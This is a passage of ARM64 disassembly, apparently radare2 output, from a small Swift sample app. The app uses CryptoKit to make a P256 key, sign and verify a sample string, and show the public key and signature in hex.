0x10000483c      mov x19, x0\n\u2502           0x100004840      adrp x21, segment.__DATA                  ; 0x100010000\n\u2502           0x100004844      add x21, x21, 0xf8\n\u2502           0x100004848      mov x0, x21                               ; int64_t arg1\n\u2502           0x10000484c      bl sym.func.100004e0c\n\u2502           0x100004850      mov x22, x0\n\u2502           0x100004854      stur x0, [x29, -0x68]\n\u2502           0x100004858      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x10000485c      add x0, x0, 0x100                         ; int64_t arg1\n\u2502           0x100004860      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004864      ldr x2, reloc.Foundation.ContiguousBytes.UInt8...szlMc ; 0x10000c368 ; int64_t arg3\n\u2502           0x100004868      mov x1, x21                               ; int64_t arg2\n\u2502           0x10000486c      bl sym.func.100005024\n\u2502           0x100004870      stur x0, [x29, -0x60]\n\u2502           0x100004874      stur x19, [x29, -0x80]\n\u2502           0x100004878      sub x0, x29, 0x80                         ; int64_t arg1\n\u2502           0x10000487c      mov x1, x22                               ; int64_t arg2\n\u2502           0x100004880      bl sym.func.100004e90\n\u2502           0x100004884      ldr x8, [x0]\n\u2502           0x100004888      add x0, x8, 0x20                          ; int64_t arg1\n\u2502           0x10000488c      ldr x8, [x8, 0x10]\n\u2502           0x100004890      add x1, x0, x8                            ; int64_t arg2\n\u2502           0x100004894      bl sym.func.100004674\n\u2502           0x100004898      mov x22, x0\n\u2502           0x10000489c      mov x19, x1\n\u2502           0x1000048a0      sub x0, x29, 0x80                         ; int64_t arg1\n\u2502           0x1000048a4      bl sym.func.100004eb4\n\u2502           0x1000048a8      stp x22, x19, [x29, -0x80]\n\u2502           0x1000048ac      mov x0, x22                               ; int64_t arg2\n\u2502           0x1000048b0      mov x1, x19\n\u2502           0x1000048b4      bl sym.func.100004ed4\n\u2502           0x1000048b8      adrp x1, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x1000048bc      ldr x1, [x1, 0x38]                        ; 0x10000c038\n\u2502                                                                      ; reloc.Foundation.Data...VN\n\u2502           0x1000048c0      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x1000048c4      ldr x2, [x2, 0x30]                        ; 0x10000c030\n\u2502                                                                      ; reloc.Foundation.Data...VAA15ContiguousBytesAAWP.ContiguousBytes...WP\n\u2502           0x1000048c8      sub x0, x29, 0x80\n\u2502           0x1000048cc      mov x8, x20\n\u2502           0x1000048d0      mov x21, 0\n\u2502           0x1000048d4      bl sym CryptoKit.P256.Signing.PrivateKey.rawRepresentation.Foundation.ContiguousBytes...lufC ; sym.imp.CryptoKit.P256.Signing.PrivateKey.rawRepresentation.Foundation.ContiguousBytes...lufC\n\u2502       \u250c\u2500&lt; 0x1000048d8      cbz x21, 0x100004900\n\u2502       \u2502   0x1000048dc      mov x0, x21\n\u2502       \u2502   0x1000048e0      bl sym.imp.swift_errorRelease\n\u2502       \u2502   0x1000048e4      ldr x8, [x28, 0x38]\n\u2502       \u2502   0x1000048e8      mov x0, x20\n\u2502       \u2502   0x1000048ec      mov w1, 1\n\u2502       \u2502   0x1000048f0      mov w2, 1\n\u2502       \u2502   0x1000048f4      mov x3, x23\n\u2502       \u2502   0x1000048f8      blr x8\n\u2502      \u250c\u2500\u2500&lt; 0x1000048fc      b 0x100004940\n\u2502      \u2502\u2502   ; CODE XREF from sym.func.1000046dc @ 0x1000048d8(x)\n\u2502      \u2502\u2514\u2500&gt; 0x100004900      stp x27, x24, [x29, -0xf0]\n\u2502      \u2502    0x100004904      stur x26, [x29, -0xf8]\n\u2502      \u2502    0x100004908      ldur x27, [x29, -0xb8]\n\u2502      \u2502    0x10000490c      ldr x8, [x28, 0x38]\n\u2502      \u2502    0x100004910      mov x0, x20\n\u2502      \u2502    0x100004914      mov w1, 0\n\u2502      \u2502    0x100004918      mov w2, 1\n\u2502      \u2502    0x10000491c      mov x3, x23\n\u2502      \u2502    0x100004920      blr x8\n\u2502      \u2502    0x100004924      ldr x8, [x28, 0x30]\n\u2502      \u2502    0x100004928      mov x0, x20\n\u2502      \u2502    0x10000492c      mov w1, 1\n\u2502      \u2502    0x100004930      mov x2, x23\n\u2502      \u2502    0x100004934      blr x8\n\u2502      \u2502    0x100004938      cmp w0, 1\n\u2502      \u2502\u250c\u2500&lt; 0x10000493c      b.ne 0x1000049c4\n\u2502      \u2502\u2502   ; CODE XREF from sym.func.1000046dc @ 0x1000048fc(x)\n\u2502      \u2514\u2500\u2500&gt; 0x100004940      mov x0, x20                               ; int64_t arg1\n\u2502       \u2502   0x100004944      bl sym.func.100004f18\n\u2502       \u2502   0x100004948      ldur x9, [x29, -0xb0]\n\u2502       \u2502   0x10000494c      ldur x8, [x29, -0xa8]\n\u2502       \u2502   0x100004950      stp x9, x8, [x29, -0x80]\n\u2502       \u2502   0x100004954      ldur x8, [x29, -0xa0]\n\u2502       \u2502   0x100004958      stur x8, [x29, -0x70]\n\u2502       \u2502   0x10000495c      mov x8, 0x13\n\u2502       \u2502   0x100004960      movk x8, 0xd000, lsl 48\n\u2502       \u2502   0x100004964      add x8, x8, 0xa\n\u2502       \u2502   0x100004968      adrp x9, 0x100007000\n\u2502       \u2502   0x10000496c      add x9, x9, 0xf00                         ; 0x100007f00 ; \"Failed to create private key.\"\n\u2502       \u2502   0x100004970      sub x9, x9, 0x20\n\u2502       \u2502   0x100004974      orr x9, x9, 0x8000000000000000\n\u2502       \u2502   0x100004978      stp x8, x9, [x29, -0x98]\n\u2502       \u2502   0x10000497c      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502       \u2502   0x100004980      add x0, x0, 0x108                         ; int64_t arg1\n\u2502       \u2502   0x100004984      bl sym.func.100004e0c\n\u2502       \u2502   0x100004988      mov x1, x0\n\u2502       \u2502   0x10000498c      sub x0, x29, 0x98\n\u2502       \u2502   0x100004990      sub x20, x29, 0x80\n\u2502       \u2502   0x100004994      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502       \u2502   ; CODE XREF from sym.func.1000046dc @ 0x100004db0(x)\n\u2502      \u250c\u2500\u2500&gt; 0x100004998      mov x0, x22                               ; void *arg0\n\u2502      \u254e\u2502   0x10000499c      mov x1, x19                               ; int64_t arg2\n\u2502      \u254e\u2502   0x1000049a0      bl sym.func.100004f58\n\u2502      \u254e\u2502   0x1000049a4      sub sp, x29, 0x50\n\u2502      \u254e\u2502   0x1000049a8      ldp x29, x30, [var_50h_2]\n\u2502      \u254e\u2502   0x1000049ac      ldp x20, x19, [var_40h]\n\u2502      \u254e\u2502   0x1000049b0      ldp x22, x21, [var_30h]\n\u2502      \u254e\u2502   0x1000049b4      ldp x24, x23, [var_20h]\n\u2502      \u254e\u2502   0x1000049b8      ldp x26, x25, [var_10h]\n\u2502      \u254e\u2502   0x1000049bc      ldp x28, x27, [sp], 0x60\n\u2502      \u254e\u2502   0x1000049c0      ret\n\u2502      \u254e\u2502   ; CODE XREF from sym.func.1000046dc @ 0x10000493c(x)\n\u2502      \u254e\u2514\u2500&gt; 0x1000049c4      ldr x8, [x28, 0x20]\n\u2502      \u254e    0x1000049c8      ldur x26, [x29, -0xe8]\n\u2502      \u254e    0x1000049cc      mov x0, x26\n\u2502      \u254e    0x1000049d0      mov x1, x20\n\u2502      \u254e    0x1000049d4      mov x2, x23\n\u2502      \u254e    0x1000049d8      blr x8\n\u2502      \u254e    0x1000049dc      stur x25, [x29, -0x100]\n\u2502      \u254e    0x1000049e0      mov x8, x25\n\u2502      \u254e    0x1000049e4      mov x20, x26\n\u2502      \u254e    0x1000049e8      bl sym CryptoKit.P256.Signing.PrivateKey.public...F0AE06PublicF0Vvg.Public...F0Vvg...Vvg ; sym.imp.CryptoKit.P256.Signing.PrivateKey.public...F0AE06PublicF0Vvg.Public...F0Vvg...Vvg\n\u2502      \u254e    0x1000049ec      mov x8, 0x13\n\u2502      \u254e    0x1000049f0      movk x8, 0xd000, lsl 48\n\u2502      \u254e    0x1000049f4      add x8, x8, 2\n\u2502      \u254e    0x1000049f8      adrp x9, 0x100007000\n\u2502      \u254e    0x1000049fc      add x9, x9, 0xf20                         ; 0x100007f20 ; \"This is a sample text\"\n\u2502      \u254e    0x100004a00      sub x9, x9, 0x20\n\u2502      \u254e    0x100004a04      orr x9, x9, 0x8000000000000000\n\u2502      \u254e    0x100004a08      stp x8, x9, [x29, -0x80]\n\u2502      \u254e    0x100004a0c      ldur x25, [x29, -0xc0]\n\u2502      \u254e    0x100004a10      mov x8, x25\n\u2502      \u254e    0x100004a14      bl sym Foundation...8EncodingV4utf8ACvgZ  ; sym.imp.Foundation...8EncodingV4utf8ACvgZ\n\u2502      \u254e    0x100004a18      bl sym.func.100004f9c\n\u2502      \u254e    0x100004a1c      mov x3, x0\n\u2502      \u254e    0x100004a20      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502      \u254e    0x100004a24      ldr x2, reloc....SSN                      ; 0x10000c358\n\u2502      \u254e    0x100004a28      sub x20, x29, 0x80\n\u2502      \u254e    0x100004a2c      mov x0, x25\n\u2502      \u254e    0x100004a30      mov w1, 0\n\u2502      \u254e    0x100004a34      bl sym Foundation...btF                   ; sym.imp.Foundation...btF\n\u2502      \u254e    0x100004a38      mov x20, x0\n\u2502      \u254e    0x100004a3c      mov x24, x1\n\u2502      \u254e    0x100004a40      ldp x8, x1, [x29, -0xd0]\n\u2502      \u254e    0x100004a44      ldr x8, [x8, 8]\n\u2502      \u254e    0x100004a48      mov x0, x25\n\u2502      \u254e    0x100004a4c      blr x8\n\u2502      \u254e    0x100004a50      ldur x0, [x29, -0x78]                     ; void *arg0\n\u2502      \u254e    0x100004a54      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u254e    0x100004a58      stur x24, [x29, -0xc8]\n\u2502      \u254e    0x100004a5c      lsr x8, x24, 0x3c\n\u2502      \u254e    0x100004a60      cmp x8, 0xe\n\u2502      \u254e\u250c\u2500&lt; 0x100004a64      b.hi 0x100004db4\n\u2502      \u254e\u2502   0x100004a68      sub x8, x29, 0x10\n\u2502      \u254e\u2502   0x100004a6c      stur x28, [x8, -0x100]\n\u2502      \u254e\u2502   0x100004a70      sub x8, x29, 8\n\u2502      \u254e\u2502   0x100004a74      stur x23, [x8, -0x100]\n\u2502      \u254e\u2502   0x100004a78      stur x20, [x29, -0xd0]\n\u2502      \u254e\u2502   0x100004a7c      ldur x8, [x29, -0xc8]\n\u2502      \u254e\u2502   0x100004a80      stp x20, x8, [x29, -0x80]\n\u2502      \u254e\u2502   0x100004a84      bl sym.func.100004fe0\n\u2502      \u254e\u2502   0x100004a88      mov x2, x0\n\u2502      \u254e\u2502   0x100004a8c      adrp x1, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502      \u254e\u2502   0x100004a90      ldr x1, [x1, 0x38]                        ; 0x10000c038\n\u2502      \u254e\u2502                                                              ; reloc.Foundation.Data...VN\n\u2502      \u254e\u2502   0x100004a94      sub x0, x29, 0x80\n\u2502      \u254e\u2502   0x100004a98      mov x28, x27\n\u2502      \u254e\u2502   0x100004a9c      mov x27, x2\n\u2502      \u254e\u2502   0x100004aa0      mov x8, x28\n\u2502      \u254e\u2502   0x100004aa4      mov x20, x26\n\u2502      \u254e\u2502   0x100004aa8      bl sym CryptoKit.P256.Signing.PrivateKey.signature.for.ECDSASignature.Foundation.DataProtocol...lF ; sym.imp.CryptoKit.P256.Signing.PrivateKey.signature.for.ECDSASignature.Foundation.DataProtocol...lF\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x100004aac      cbnz x21, 0x100004ddc\n\u2502     \u2502\u254e\u2502   0x100004ab0      mov x20, x28\n\u2502     \u2502\u254e\u2502   0x100004ab4      bl sym CryptoKit.P256.Signing.ECDSASignature.rawRepresentation.Foundation.Data...Vvg ; sym.imp.CryptoKit.P256.Signing.ECDSASignature.rawRepresentation.Foundation.Data...Vvg\n\u2502     \u2502\u254e\u2502   0x100004ab8      mov x20, x0\n\u2502     \u2502\u254e\u2502   0x100004abc      mov x25, x1\n\u2502     \u2502\u254e\u2502   0x100004ac0      bl sym.func.100004000\n\u2502     \u2502\u254e\u2502   0x100004ac4      mov x26, x0\n\u2502     \u2502\u254e\u2502   0x100004ac8      mov x0, x20                               ; void *arg0\n\u2502     \u2502\u254e\u2502   0x100004acc      mov x1, x25                               ; int64_t arg2\n\u2502     \u2502\u254e\u2502   0x100004ad0      bl sym.func.100004f58\n\u2502     \u2502\u254e\u2502   0x100004ad4      stur x26, [x29, -0x80]\n\u2502     \u2502\u254e\u2502   0x100004ad8      adrp x20, segment.__DATA                  ; 0x100010000\n\u2502     \u2502\u254e\u2502   0x100004adc      add x20, x20, 0x120\n\u2502     \u2502\u254e\u2502   0x100004ae0      mov x0, x20                               ; int64_t arg1\n\u2502     \u2502\u254e\u2502   0x100004ae4      bl sym.func.100004e0c\n\u2502     \u2502\u254e\u2502   0x100004ae8      mov x23, x0\n\u2502     \u2502\u254e\u2502   0x100004aec      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502     \u2502\u254e\u2502   0x100004af0      add x0, x0, 0x128                         ; int64_t arg1\n\u2502     \u2502\u254e\u2502   0x100004af4      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502     \u2502\u254e\u2502   0x100004af8      ldr x2, reloc....SayxGSKsMc               ; 0x10000c370 ; int64_t arg3\n\u2502     \u2502\u254e\u2502   0x100004afc      mov x1, x20                               ; int64_t arg2\n\u2502     \u2502\u254e\u2502   0x100004b00      bl sym.func.100005024\n\u2502     \u2502\u254e\u2502   0x100004b04      mov x3, x0\n\u2502     \u2502\u254e\u2502   0x100004b08      mov x25, -0x2000000000000000\n\u2502     \u2502\u254e\u2502   0x100004b0c      sub x20, x29, 0x80\n\u2502     \u2502\u254e\u2502   0x100004b10      mov x0, 0\n\u2502     \u2502\u254e\u2502   0x100004b14      mov x1, -0x2000000000000000\n\u2502     \u2502\u254e\u2502   0x100004b18      sub x8, x29, 0x28\n\u2502     \u2502\u254e\u2502   0x100004b1c      stur x23, [x8, -0x100]\n\u2502     \u2502\u254e\u2502   0x100004b20      mov x2, x23\n\u2502     \u2502\u254e\u2502   0x100004b24      sub x8, x29, 0x30\n\u2502     \u2502\u254e\u2502   0x100004b28      stur x3, [x8, -0x100]\n\u2502     \u2502\u254e\u2502   0x100004b2c      bl sym Element...F                        ; sym.imp.Element...F\n\u2502     \u2502\u254e\u2502   0x100004b30      sub x8, x29, 0x20\n\u2502     \u2502\u254e\u2502   0x100004b34      stur x0, [x8, -0x100]\n\u2502     \u2502\u254e\u2502   0x100004b38      sub x8, x29, 0x18\n\u2502     \u2502\u254e\u2502   0x100004b3c      stur x1, [x8, -0x100]\n\u2502     \u2502\u254e\u2502   0x100004b40      mov x0, x26                               ; void *arg0\n\u2502     \u2502\u254e\u2502   0x100004b44      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502     \u2502\u254e\u2502   0x100004b48      ldp x23, x24, [x29, -0xd0]\n\u2502     \u2502\u254e\u2502   0x100004b4c      stp x23, x24, [x29, -0x80]\n\u2502     \u2502\u254e\u2502   0x100004b50      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502     \u2502\u254e\u2502   0x100004b54      ldr x2, [x2, 0x38]                        ; 0x10000c038\n\u2502     \u2502\u254e\u2502                                                              ; reloc.Foundation.Data...VN\n\u2502     \u2502\u254e\u2502   0x100004b58      sub x1, x29, 0x80\n\u2502     \u2502\u254e\u2502   0x100004b5c      mov x0, x28\n\u2502     \u2502\u254e\u2502   0x100004b60      mov x3, x27\n\u2502     \u2502\u254e\u2502   0x100004b64      ldur x27, [x29, -0x100]\n\u2502     \u2502\u254e\u2502   0x100004b68      mov x20, x27\n\u2502     \u2502\u254e\u2502   0x100004b6c      bl sym CryptoKit.P256.Signing.PublicKey.isValidSignature.for.ECDSASignature.Foundation.DataProtocol...lF ; sym.imp.CryptoKit.P256.Signing.PublicKey.isValidSignature.for.ECDSASignature.Foundation.DataProtocol...lF\n\u2502     \u2502\u254e\u2502   0x100004b70      mov x26, x0\n\u2502     \u2502\u254e\u2502   0x100004b74      stp xzr, x25, [x29, -0x80]\n\u2502     \u2502\u254e\u2502   0x100004b78      sub x20, x29, 0x80\n\u2502     \u2502\u254e\u2502   0x100004b7c      mov w0, 0x49                              ; 'I'\n\u2502     \u2502\u254e\u2502   0x100004b80      bl sym _StringGuts.grow...SiF             ; sym.imp._StringGuts.grow...SiF\n\u2502     \u2502\u254e\u2502   0x100004b84      ldp x8, x9, [x29, -0x80]\n\u2502     \u2502\u254e\u2502   0x100004b88      stp x8, x9, [x29, -0x80]\n\u2502     \u2502\u254e\u2502   0x100004b8c      sub x20, x29, 0x80\n\u2502     \u2502\u254e\u2502   0x100004b90      mov x0, 0x724f                            ; 'Or'\n\u2502     \u2502\u254e\u2502   0x100004b94      movk x0, 0x6769, lsl 16                   ; 'ig'\n\u2502     \u2502\u254e\u2502   0x100004b98      movk x0, 0x6e69, lsl 32                   ; 'in'\n\u2502     \u2502\u254e\u2502   0x100004b9c      movk x0, 0x6c61, lsl 48                   ; 'al'\n\u2502     \u2502\u254e\u2502   0x100004ba0      mov x1, 0x203a                            ; ': '\n\u2502     \u2502\u254e\u2502   0x100004ba4      movk x1, 0xea00, lsl 48\n\u2502     \u2502\u254e\u2502   0x100004ba8      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502     \u2502\u254e\u2502   0x100004bac      ldur x20, [x29, -0xc0]\n\u2502     \u2502\u254e\u2502   0x100004bb0      mov x8, x20\n\u2502     \u2502\u254e\u2502   0x100004bb4      bl sym Foundation...8EncodingV4utf8ACvgZ  ; sym.imp.Foundation...8EncodingV4utf8ACvgZ\n\u2502     \u2502\u254e\u2502   0x100004bb8      mov x0, x23\n\u2502     \u2502\u254e\u2502   0x100004bbc      mov x1, x24\n\u2502     \u2502\u254e\u2502   0x100004bc0      mov x2, x20\n\u2502     \u2502\u254e\u2502   0x100004bc4      bl sym Foundation__String...AAE8EncodingVtcfC ; sym.imp.Foundation__String...AAE8EncodingVtcfC\n\u2502    \u250c\u2500\u2500\u2500\u2500&lt; 0x100004bc8      cbz x1, 0x100004dc8\n\u2502    \u2502\u2502\u254e\u2502   0x100004bcc      mov x23, x27\n\u2502    \u2502\u2502\u254e\u2502   0x100004bd0      mov x24, x1\n\u2502    \u2502\u2502\u254e\u2502   0x100004bd4      adrp x8, 0x100007000\n\u2502    \u2502\u2502\u254e\u2502   0x100004bd8      add x8, x8, 0xf60                         ; 0x100007f60 ; \"Signature is invalid.\"\n\u2502    \u2502\u2502\u254e\u2502   0x100004bdc      sub x8, x8, 0x20\n\u2502    \u2502\u2502\u254e\u2502   0x100004be0      orr x8, x8, 0x8000000000000000\n\u2502    \u2502\u2502\u254e\u2502   0x100004be4      adrp x9, 0x100007000\n\u2502    \u2502\u2502\u254e\u2502   0x100004be8      add x9, x9, 0xfe0                         ; 0x100007fe0 ; \"Signature is valid.\"\n\u2502    \u2502\u2502\u254e\u2502   0x100004bec      sub x9, x9, 0x20\n\u2502    \u2502\u2502\u254e\u2502   0x100004bf0      orr x9, x9, 0x8000000000000000\n\u2502    \u2502\u2502\u254e\u2502   0x100004bf4      tst w26, 1\n\u2502    \u2502\u2502\u254e\u2502   0x100004bf8      csel x26, x9, x8, ne\n\u2502    \u2502\u2502\u254e\u2502   0x100004bfc      mov x27, 0x13\n\u2502    \u2502\u2502\u254e\u2502   0x100004c00      movk x27, 0xd000, lsl 48\n\u2502    \u2502\u2502\u254e\u2502   0x100004c04      add x8, x27, 2\n\u2502    \u2502\u2502\u254e\u2502   0x100004c08      csel x8, x27, x8, ne\n\u2502    \u2502\u2502\u254e\u2502   0x100004c0c      stur x8, [x29, -0xc0]\n\u2502    \u2502\u2502\u254e\u2502   0x100004c10      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004c14      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004c18      mov x0, x24                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c1c      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004c20      add x0, x27, 1\n\u2502    \u2502\u2502\u254e\u2502   0x100004c24      adrp x8, 0x100007000\n\u2502    \u2502\u2502\u254e\u2502   0x100004c28      add x8, x8, 0xf80                         ; 0x100007f80 ; \"\\n\\nPublic Key (Hex): \"\n\u2502    \u2502\u2502\u254e\u2502   0x100004c2c      sub x8, x8, 0x20\n\u2502    \u2502\u2502\u254e\u2502   0x100004c30      orr x1, x8, 0x8000000000000000\n\u2502    \u2502\u2502\u254e\u2502   0x100004c34      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004c38      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004c3c      mov x20, x23\n\u2502    \u2502\u2502\u254e\u2502   0x100004c40      bl sym CryptoKit.P256.Signing.PublicKey.rawRepresentation.Foundation.Data...Vvg ; sym.imp.CryptoKit.P256.Signing.PublicKey.rawRepresentation.Foundation.Data...Vvg\n\u2502    \u2502\u2502\u254e\u2502   0x100004c44      mov x20, x0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c48      mov x24, x1\n\u2502    \u2502\u2502\u254e\u2502   0x100004c4c      bl sym.func.100004000\n\u2502    \u2502\u2502\u254e\u2502   0x100004c50      mov x21, x0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c54      mov x0, x20                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c58      mov x1, x24                               ; int64_t arg2\n\u2502    \u2502\u2502\u254e\u2502   0x100004c5c      bl sym.func.100004f58\n\u2502    \u2502\u2502\u254e\u2502   0x100004c60      stur x21, [x29, -0x98]\n\u2502    \u2502\u2502\u254e\u2502   0x100004c64      sub x20, x29, 0x98\n\u2502    \u2502\u2502\u254e\u2502   0x100004c68      mov x0, 0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c6c      mov x1, -0x2000000000000000\n\u2502    \u2502\u2502\u254e\u2502   0x100004c70      sub x8, x29, 0x28\n\u2502    \u2502\u2502\u254e\u2502   0x100004c74      ldur x2, [x8, -0x100]\n\u2502    \u2502\u2502\u254e\u2502   0x100004c78      sub x8, x29, 0x30\n\u2502    \u2502\u2502\u254e\u2502   0x100004c7c      ldur x3, [x8, -0x100]\n\u2502    \u2502\u2502\u254e\u2502   0x100004c80      bl sym Element...F                        ; sym.imp.Element...F\n\u2502    \u2502\u2502\u254e\u2502   0x100004c84      mov x24, x0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c88      mov x25, x1\n\u2502    \u2502\u2502\u254e\u2502   0x100004c8c      mov x0, x21                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004c90      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004c94      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004c98      mov x0, x24\n\u2502    \u2502\u2502\u254e\u2502   0x100004c9c      mov x1, x25\n\u2502    \u2502\u2502\u254e\u2502   0x100004ca0      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004ca4      mov x0, x25                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004ca8      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004cac      adrp x8, 0x100007000\n\u2502    \u2502\u2502\u254e\u2502   0x100004cb0      add x8, x8, 0xfa0                         ; 0x100007fa0 ; \"\\n\\nSignature (Hex): \"\n\u2502    \u2502\u2502\u254e\u2502   0x100004cb4      sub x8, x8, 0x20\n\u2502    \u2502\u2502\u254e\u2502   0x100004cb8      orr x1, x8, 0x8000000000000000\n\u2502    \u2502\u2502\u254e\u2502   0x100004cbc      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004cc0      mov x0, 0x13\n\u2502    \u2502\u2502\u254e\u2502   0x100004cc4      movk x0, 0xd000, lsl 48\n\u2502    \u2502\u2502\u254e\u2502   0x100004cc8      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004ccc      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004cd0      sub x8, x29, 0x20\n\u2502    \u2502\u2502\u254e\u2502   0x100004cd4      ldur x0, [x8, -0x100]\n\u2502    \u2502\u2502\u254e\u2502   0x100004cd8      sub x8, x29, 0x18\n\u2502    \u2502\u2502\u254e\u2502   0x100004cdc      ldur x24, [x8, -0x100]\n\u2502    \u2502\u2502\u254e\u2502   0x100004ce0      mov x1, x24\n\u2502    \u2502\u2502\u254e\u2502   0x100004ce4      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004ce8      sub x0, x27, 3\n\u2502    \u2502\u2502\u254e\u2502   0x100004cec      adrp x8, 0x100007000\n\u2502    \u2502\u2502\u254e\u2502   0x100004cf0      add x8, x8, 0xfc0                         ; 0x100007fc0 ; \"\\n\\nVerification: \"\n\u2502    \u2502\u2502\u254e\u2502   0x100004cf4      sub x8, x8, 0x20\n\u2502    \u2502\u2502\u254e\u2502   0x100004cf8      orr x1, x8, 0x8000000000000000\n\u2502    \u2502\u2502\u254e\u2502   0x100004cfc      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004d00      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004d04      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004d08      ldur x0, [x29, -0xc0]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d0c      mov x1, x26\n\u2502    \u2502\u2502\u254e\u2502   0x100004d10      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502    \u2502\u2502\u254e\u2502   0x100004d14      ldp x8, x21, [x29, -0x80]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d18      ldur x10, [x29, -0xb0]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d1c      ldur x9, [x29, -0xa8]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d20      stp x10, x9, [x29, -0x80]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d24      ldur x9, [x29, -0xa0]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d28      stur x9, [x29, -0x70]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d2c      stp x8, x21, [x29, -0x98]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d30      mov x0, x21                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004d34      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004d38      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502    \u2502\u2502\u254e\u2502   0x100004d3c      add x0, x0, 0x108                         ; int64_t arg1\n\u2502    \u2502\u2502\u254e\u2502   0x100004d40      bl sym.func.100004e0c\n\u2502    \u2502\u2502\u254e\u2502   0x100004d44      mov x1, x0\n\u2502    \u2502\u2502\u254e\u2502   0x100004d48      sub x0, x29, 0x98\n\u2502    \u2502\u2502\u254e\u2502   0x100004d4c      sub x20, x29, 0x80\n\u2502    \u2502\u2502\u254e\u2502   0x100004d50      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502    \u2502\u2502\u254e\u2502   0x100004d54      ldp x8, x1, [x29, -0xe0]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d58      ldr x8, [x8, 8]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d5c      mov x0, x28\n\u2502    \u2502\u2502\u254e\u2502   0x100004d60      blr x8\n\u2502    \u2502\u2502\u254e\u2502   0x100004d64      ldp x8, x1, [x29, -0xf8]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d68      ldr x8, [x8, 8]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d6c      mov x0, x23\n\u2502    \u2502\u2502\u254e\u2502   0x100004d70      blr x8\n\u2502    \u2502\u2502\u254e\u2502   0x100004d74      sub x8, x29, 0x10\n\u2502    \u2502\u2502\u254e\u2502   0x100004d78      ldur x8, [x8, -0x100]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d7c      ldr x8, [x8, 8]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d80      ldur x0, [x29, -0xe8]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d84      sub x9, x29, 8\n\u2502    \u2502\u2502\u254e\u2502   0x100004d88      ldur x1, [x9, -0x100]\n\u2502    \u2502\u2502\u254e\u2502   0x100004d8c      blr x8\n\u2502    \u2502\u2502\u254e\u2502   0x100004d90      mov x0, x24                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004d94      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004d98      mov x0, x26                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004d9c      bl 